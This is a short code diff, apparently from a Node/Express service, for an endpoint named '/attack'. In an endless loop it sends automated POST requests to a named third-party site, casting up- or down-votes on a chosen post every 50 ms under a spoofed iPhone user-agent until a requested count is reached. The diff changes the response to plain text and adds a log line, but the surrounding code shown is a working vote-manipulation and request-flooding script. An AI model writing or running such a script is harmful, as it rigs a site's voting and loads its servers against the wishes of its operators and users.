@@ -18,7 +18,7 @@ app.post('/attack', async (req, res) => {
   const id = req.body.id;
   const voteType = req.body.voteType;
   let count = 0;
-  res.status(200).json({"status": "started"})
+  res.status(200).send("started")
   while ( true ) {
     await sleep(50);
     fetch(`https://healthy-person-emulator.org/archives/${id}?_data=routes%2F_layout.archives.%24postId`, {method: "POST", headers: {
@@ -26,6 +26,7 @@ app.post('/attack', async (req, res) => {
         "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
       }, body: `postId=${Number(id)}&voteType=${voteType}&action=votePost`},).then((data) => {
       count++;
+      console.log("yes")
     })
     if ( count >= req.body.amount ){
       break;
